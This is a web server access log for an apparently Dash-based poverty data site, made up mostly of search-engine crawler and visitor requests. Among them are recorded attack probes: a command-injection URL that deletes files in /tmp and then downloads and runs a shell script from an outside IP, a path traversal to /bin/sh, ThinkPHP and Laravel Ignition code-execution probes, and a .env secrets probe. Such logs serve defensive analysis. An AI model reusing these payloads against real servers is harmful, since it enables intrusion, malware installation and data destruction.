5.8.10.202 - - [17/Nov/2021:20:06:38 +0000] "GET /aaa9 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [17/Nov/2021:20:06:38 +0000] "GET / HTTP/1.1" 200 144683 "-" "fasthttp"
5.8.10.202 - - [17/Nov/2021:20:06:39 +0000] "GET /aab9 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [17/Nov/2021:20:06:48 +0000] "GET /aaa9 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
5.8.10.202 - - [17/Nov/2021:20:06:49 +0000] "GET /aab9 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36"
109.95.61.19 - - [17/Nov/2021:20:07:27 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
192.241.198.99 - - [17/Nov/2021:20:15:53 +0000] "GET /actuator/health HTTP/1.1" 200 13270 "-" "Mozilla/5.0 zgrab/0.x"
45.146.164.110 - - [17/Nov/2021:20:28:35 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
154.209.125.25 - - [17/Nov/2021:20:29:06 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
207.46.13.189 - - [17/Nov/2021:20:33:48 +0000] "GET /sitemap.txt HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
93.200.153.184 - - [17/Nov/2021:20:41:42 +0000] "GET / HTTP/1.1" 200 114524 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
157.55.39.138 - - [17/Nov/2021:20:50:21 +0000] "GET /sitemap.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.158 - - [17/Nov/2021:21:19:06 +0000] "GET /sitemaps.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
45.146.164.110 - - [17/Nov/2021:21:21:27 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
157.55.39.138 - - [17/Nov/2021:21:24:04 +0000] "GET /sitemap.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
180.149.125.169 - - [17/Nov/2021:21:24:38 +0000] "GET /c/ HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 5.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36"
157.55.39.72 - - [17/Nov/2021:21:40:54 +0000] "GET /atom.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.189 - - [17/Nov/2021:21:44:24 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
39.106.5.207 - - [17/Nov/2021:21:48:03 +0000] "GET / HTTP/1.1" 200 80913 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
79.141.113.174 - - [17/Nov/2021:21:52:20 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+212.193.30.245/bins.sh;sh+/tmp/bins.sh HTTP/1.1" 499 0 "-" "Hello, world"
66.249.64.226 - - [17/Nov/2021:22:06:29 +0000] "GET /Maldives HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:22:07:06 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Maldives" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.226 - - [17/Nov/2021:22:07:07 +0000] "GET /_dash-component-suites/dash_core_components/async-dropdown.v1_15_0m1611086576.js HTTP/1.1" 200 30740 "https://povertydata.org/Maldives" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.253 - - [17/Nov/2021:22:07:07 +0000] "POST /_dash-update-component HTTP/1.1" 200 86 "https://povertydata.org/Maldives" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.253 - - [17/Nov/2021:22:07:08 +0000] "POST /_dash-update-component HTTP/1.1" 200 2609 "https://povertydata.org/Maldives" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Chrome/95.0.4638.69 Safari/537.36"
66.249.64.231 - - [17/Nov/2021:22:21:29 +0000] "GET /l/Honduras HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
194.48.199.78 - - [17/Nov/2021:22:23:55 +0000] "GET /servlets/com.adventnet.tools.sum.transport.SUMCommunicationServlet HTTP/1.1" 200 13270 "-" "curl/7.64.1"
5.183.181.22 - - [17/Nov/2021:22:42:21 +0000] "GET / HTTP/1.1" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36"
35.195.93.98 - - [17/Nov/2021:22:42:24 +0000] "GET / HTTP/1.1" 200 13270 "-" "python-requests/2.26.0"
114.119.155.210 - - [17/Nov/2021:22:46:29 +0000] "GET /Chile HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 7.0;) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; PetalBot;+https://webmaster.petalsearch.com/site/petalbot)"
66.249.64.226 - - [17/Nov/2021:22:51:29 +0000] "GET /Tuvalu HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.231 - - [17/Nov/2021:22:52:30 +0000] "GET /_dash-dependencies HTTP/1.1" 200 430 "https://povertydata.org/Tuvalu" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:22:52:31 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Tuvalu" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:22:52:31 +0000] "POST /_dash-update-component HTTP/1.1" 200 84 "https://povertydata.org/Tuvalu" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:22:52:32 +0000] "POST /_dash-update-component HTTP/1.1" 200 2537 "https://povertydata.org/Tuvalu" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [17/Nov/2021:22:53:48 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Tuvalu" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:22:53:48 +0000] "POST /_dash-update-component HTTP/1.1" 200 84 "https://povertydata.org/Tuvalu" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:22:53:49 +0000] "POST /_dash-update-component HTTP/1.1" 200 2537 "https://povertydata.org/Tuvalu" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
54.216.196.110 - - [17/Nov/2021:22:59:51 +0000] "GET / HTTP/1.1" 200 144683 "-" "webprosbot/2.0 (+mailto:abuse-6337@webpros.com)"
45.146.164.110 - - [17/Nov/2021:23:06:17 +0000] "POST /cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh HTTP/1.1" 400 166 "-" "-"
178.62.59.163 - - [17/Nov/2021:23:08:31 +0000] "GET /.env HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
178.62.59.163 - - [17/Nov/2021:23:08:31 +0000] "POST / HTTP/1.1" 405 178 "-" "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.129 Safari/537.36"
207.46.13.158 - - [17/Nov/2021:23:14:37 +0000] "GET /sitemaps.xml HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
66.249.64.233 - - [17/Nov/2021:23:16:43 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://povertydata.org/l/Honduras" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:23:21:29 +0000] "GET /Moldova HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:23:21:32 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Moldova" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [17/Nov/2021:23:21:32 +0000] "GET /_dash-component-suites/dash_core_components/async-dropdown.v1_15_0m1611086576.js HTTP/1.1" 200 30740 "https://povertydata.org/Moldova" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:23:21:33 +0000] "POST /_dash-update-component HTTP/1.1" 200 85 "https://povertydata.org/Moldova" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [17/Nov/2021:23:21:34 +0000] "POST /_dash-update-component HTTP/1.1" 200 2692 "https://povertydata.org/Moldova" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
207.46.13.189 - - [17/Nov/2021:23:27:18 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.189 - - [17/Nov/2021:23:27:28 +0000] "GET /_dash-component-suites/dash_bootstrap_components/_components/dash_bootstrap_components.v0_11_3m1618740747.min.js HTTP/1.1" 200 54303 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.189 - - [17/Nov/2021:23:27:28 +0000] "GET /_dash-component-suites/dash_renderer/dash_renderer.v1_9_0m1611082209.min.js HTTP/1.1" 200 59217 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.189 - - [17/Nov/2021:23:27:28 +0000] "GET /_dash-component-suites/dash_renderer/polyfill@7.v1_9_0m1611082192.8.7.min.js HTTP/1.1" 200 34243 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
207.46.13.189 - - [17/Nov/2021:23:27:29 +0000] "GET /_dash-component-suites/dash_renderer/react@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 4898 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.72 - - [17/Nov/2021:23:27:34 +0000] "GET /_dash-component-suites/dash_core_components/dash_core_components.v1_15_0m1611086582.min.js HTTP/1.1" 200 118829 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.138 - - [17/Nov/2021:23:27:36 +0000] "GET /_dash-component-suites/dash_html_components/dash_html_components.v1_1_2m1611087126.min.js HTTP/1.1" 200 18907 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.121 - - [17/Nov/2021:23:27:38 +0000] "GET /_dash-component-suites/dash_renderer/prop-types@15.v1_9_0m1611082192.7.2.min.js HTTP/1.1" 200 832 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.121 - - [17/Nov/2021:23:27:38 +0000] "GET /_dash-component-suites/dash_renderer/react-dom@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 38049 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
157.55.39.121 - - [17/Nov/2021:23:27:39 +0000] "GET /_dash-component-suites/dash_table/bundle.v4_11_2m1611087174.js HTTP/1.1" 200 11013 "-" "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)"
164.92.241.30 - - [17/Nov/2021:23:27:59 +0000] "GET / HTTP/1.0" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
164.92.241.30 - - [17/Nov/2021:23:28:57 +0000] "HEAD / HTTP/1.1" 200 0 "-" "-"
45.137.23.85 - - [17/Nov/2021:23:42:02 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 zgrab/0.x"
66.249.64.163 - - [17/Nov/2021:23:51:31 +0000] "GET /Lesotho HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
40.77.189.176 - - [17/Nov/2021:23:58:27 +0000] "GET /_dash-layout HTTP/1.1" 200 25709 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
40.77.189.176 - - [17/Nov/2021:23:58:27 +0000] "GET /_dash-dependencies HTTP/1.1" 200 2239 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534+ (KHTML, like Gecko) BingPreview/1.0b"
66.249.64.233 - - [16/Nov/2021:00:02:13 +0000] "GET /l/Switzerland HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
64.227.39.201 - - [16/Nov/2021:00:12:58 +0000] "GET / HTTP/1.0" 200 144683 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0"
95.182.105.223 - - [16/Nov/2021:00:13:13 +0000] "GET /shell?cd+/tmp;rm+-rf+*;wget+212.193.30.245/bins.sh;sh+/tmp/bins.sh HTTP/1.1" 499 0 "-" "Hello, world"
64.227.39.201 - - [16/Nov/2021:00:15:19 +0000] "GET /_ignition/execute-solution HTTP/1.1" 200 13270 "-" "python-requests/2.18.4"
66.249.64.226 - - [16/Nov/2021:00:24:43 +0000] "GET /Peru HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.226 - - [16/Nov/2021:00:24:46 +0000] "GET /_dash-component-suites/dash_renderer/polyfill@7.v1_9_0m1611082192.8.7.min.js HTTP/1.1" 200 34243 "https://povertydata.org/Peru" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.251 - - [16/Nov/2021:00:24:50 +0000] "POST /_dash-update-component HTTP/1.1" 200 2835 "https://povertydata.org/Peru" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [16/Nov/2021:00:24:51 +0000] "GET /_dash-component-suites/dash_core_components/async-plotlyjs.v1_15_0m1611086576.js HTTP/1.1" 200 1034213 "https://povertydata.org/Peru" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [16/Nov/2021:00:24:52 +0000] "POST /_dash-update-component HTTP/1.1" 200 82 "https://povertydata.org/Peru" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.64.253 - - [16/Nov/2021:00:24:53 +0000] "POST /_dash-update-component HTTP/1.1" 200 2693 "https://povertydata.org/Peru" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
45.146.164.110 - - [16/Nov/2021:00:30:51 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
209.141.56.209 - - [16/Nov/2021:00:31:13 +0000] "GET / HTTP/1.1" 200 13270 "-" "Linux Gnu (cow)"
43.131.22.118 - - [16/Nov/2021:00:34:42 +0000] "GET / HTTP/1.1" 200 144683 "-" "-"
43.131.22.118 - - [16/Nov/2021:00:34:48 +0000] "GET //_favicon.ico?v=1.19.0 HTTP/1.1" 200 9662 "-" "Go-http-client/1.1"
66.249.64.226 - - [16/Nov/2021:00:47:13 +0000] "GET /Namibia HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
146.70.20.247 - - [16/Nov/2021:00:56:59 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (X11; Ubuntu; Linux i686 on x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2820.59 Safari/537.36"
184.105.139.69 - - [16/Nov/2021:00:58:06 +0000] "GET / HTTP/1.1" 200 90345 "-" "-"
45.146.164.110 - - [16/Nov/2021:01:04:15 +0000] "GET /index.php?s=/Index/\x5Cthink\x5Capp/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
66.249.70.4 - - [16/Nov/2021:01:09:43 +0000] "GET / HTTP/1.1" 200 13270 "-" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.4 - - [16/Nov/2021:01:14:09 +0000] "GET /_dash-component-suites/dash_renderer/prop-types@15.v1_9_0m1611082192.7.2.min.js HTTP/1.1" 200 832 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.4 - - [16/Nov/2021:01:14:09 +0000] "GET /_dash-component-suites/dash_renderer/polyfill@7.v1_9_0m1611082192.8.7.min.js HTTP/1.1" 200 34243 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.6 - - [16/Nov/2021:01:14:10 +0000] "GET /_dash-component-suites/dash_html_components/dash_html_components.v1_1_2m1611087126.min.js HTTP/1.1" 200 18907 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.4 - - [16/Nov/2021:01:14:10 +0000] "GET /_dash-component-suites/dash_renderer/react-dom@16.v1_9_0m1611082192.14.0.min.js HTTP/1.1" 200 38049 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.6 - - [16/Nov/2021:01:14:12 +0000] "GET /_dash-layout HTTP/1.1" 200 2416 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.4 - - [16/Nov/2021:01:14:12 +0000] "POST /_dash-update-component HTTP/1.1" 200 7106 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:13 +0000] "GET /_dash-component-suites/dash_core_components/async-graph.v1_15_0m1611086576.js HTTP/1.1" 200 5332 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.4 - - [16/Nov/2021:01:14:13 +0000] "GET /_dash-component-suites/dash_core_components/async-dropdown.v1_15_0m1611086576.js HTTP/1.1" 200 30740 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:14 +0000] "GET /_dash-component-suites/dash_core_components/async-markdown.v1_15_0m1611086576.js HTTP/1.1" 200 59335 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:19 +0000] "GET /_dash-component-suites/dash_core_components/async-highlight.v1_15_0m1611086576.js HTTP/1.1" 200 22977 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:20 +0000] "POST /_dash-update-component HTTP/1.1" 200 43039 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:20 +0000] "POST /_dash-update-component HTTP/1.1" 200 3569 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:20 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:21 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:21 +0000] "POST /_dash-update-component HTTP/1.1" 204 0 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
66.249.70.2 - - [16/Nov/2021:01:14:22 +0000] "POST /_dash-update-component HTTP/1.1" 200 2054 "http://www.povertydata.org/" "Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
